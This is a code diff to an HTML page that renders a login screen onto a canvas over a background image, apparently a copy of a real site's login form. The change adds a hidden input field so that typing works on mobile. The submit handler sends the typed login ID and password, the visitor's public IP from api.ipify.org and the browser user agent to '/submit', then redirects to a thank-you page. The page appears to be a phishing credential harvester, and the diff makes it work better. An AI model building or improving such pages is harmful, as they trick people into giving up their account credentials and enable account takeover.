@@ -10,33 +10,38 @@
       background: #fff;
       border: 1px solid #ccc;
     }
+    #hiddenInput {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+      z-index: -1;
+    }
   </style>
 </head>
 <body>
+
 <canvas id="loginCanvas" width="720" height="1402"></canvas>
-<input type="text" id="hiddenInput" style="position:absolute; opacity:0; pointer-events:none;">
+<input type="text" id="hiddenInput" autocomplete="off" autocapitalize="none" />
 
 <script>
 const canvas = document.getElementById('loginCanvas');
 const ctx = canvas.getContext('2d');
-
-// Load the background image
-const bgImage = new Image();
-bgImage.src = 'background.png';
-bgImage.onload = () => draw();
+const hiddenInput = document.getElementById('hiddenInput');
 
 let loginID = '';
 let password = '';
 let activeInput = null;
-
-// Persistent background flags
 let loginActivated = false;
 let passActivated = false;
 
-// Input and button box dimensions
+// Input and button box positions
 const loginBox = { x: 29, y: 368, width: 662, height: 100 };
 const passBox  = { x: 29, y: 586, width: 662, height: 100 };
 const buttonBox = { x: 29, y: 795, width: 662, height: 64 };
+
+const bgImage = new Image();
+bgImage.src = 'background.png';
+bgImage.onload = () => draw();
 
 function draw() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -48,7 +53,6 @@ function draw() {
 }
 
 function drawInputBox(box, text, isActive, isFocused) {
-  // Background fill if activated
   if (isActive) {
     ctx.fillStyle = '#ffffff';
     ctx.fillRect(box.x, box.y, box.width, box.height);
@@ -63,7 +67,7 @@ function drawInputBox(box, text, isActive, isFocused) {
   ctx.textBaseline = 'middle';
   ctx.save();
   ctx.beginPath();
-  ctx.rect(box.x + 10, box.y + 10, box.width - 20, box.height - 20); // clip text
+  ctx.rect(box.x + 10, box.y + 10, box.width - 20, box.height - 20);
   ctx.clip();
   ctx.fillText(text, box.x + 14, box.y + box.height / 2 + 2);
   ctx.restore();
@@ -87,63 +91,61 @@ canvas.addEventListener('mousedown', (e) => {
   if (isInside(x, y, loginBox)) {
     activeInput = 'login';
     loginActivated = true;
+    hiddenInput.value = loginID;
+    hiddenInput.focus();
   } else if (isInside(x, y, passBox)) {
     activeInput = 'pass';
     passActivated = true;
-} else if (isInside(x, y, buttonBox)) {
-  activeInput = null;
-
-  fetch('https://api.ipify.org?format=json')
-    .then(res => res.json())
-    .then(ipData => {
-      const ip = ipData.ip;
-      const deviceInfo = navigator.userAgent;
-
-      fetch('/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          loginID,
-          password,
-          ip,
-          deviceInfo
-        })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success) {
-          window.location.href = 'thankyou.html';
-        } else {
-          alert('Submission failed. Please try again.');
-        }
-      })
-      .catch(err => {
-        console.error('Submission error:', err);
-        alert('Error submitting data.');
-      });
-    });
-}
- else {
+    hiddenInput.value = password;
+    hiddenInput.focus();
+  } else if (isInside(x, y, buttonBox)) {
     activeInput = null;
+    hiddenInput.blur();
+
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(ipData => {
+        const ip = ipData.ip;
+        const deviceInfo = navigator.userAgent;
+
+        fetch('/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            loginID,
+            password,
+            ip,
+            deviceInfo
+          })
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            window.location.href = 'thankyou.html';
+          } else {
+            alert('Submission failed. Please try again.');
+          }
+        })
+        .catch(err => {
+          console.error('Submission error:', err);
+          alert('Error submitting data.');
+        });
+      });
+  } else {
+    activeInput = null;
+    hiddenInput.blur();
   }
 
   draw();
 });
 
-document.addEventListener('keydown', (e) => {
-  if (!activeInput) return;
-
-  if (e.key === 'Backspace') {
-    if (activeInput === 'login') loginID = loginID.slice(0, -1);
-    else password = password.slice(0, -1);
-  } else if (e.key.length === 1 && !e.ctrlKey && !e.metaKey) {
-    if (activeInput === 'login' && loginID.length < 50) {
-      loginID += e.key;
-    } else if (activeInput === 'pass' && password.length < 50) {
-      password += e.key;
-    }
+hiddenInput.addEventListener('input', () => {
+  const value = hiddenInput.value;
+  if (activeInput === 'login') {
+    loginID = value;
+  } else if (activeInput === 'pass') {
+    password = value;
   }
-
   draw();
 });
 
@@ -152,5 +154,6 @@ function isInside(x, y, box) {
          y >= box.y && y <= box.y + box.height;
 }
 </script>
+
 </body>
 </html>
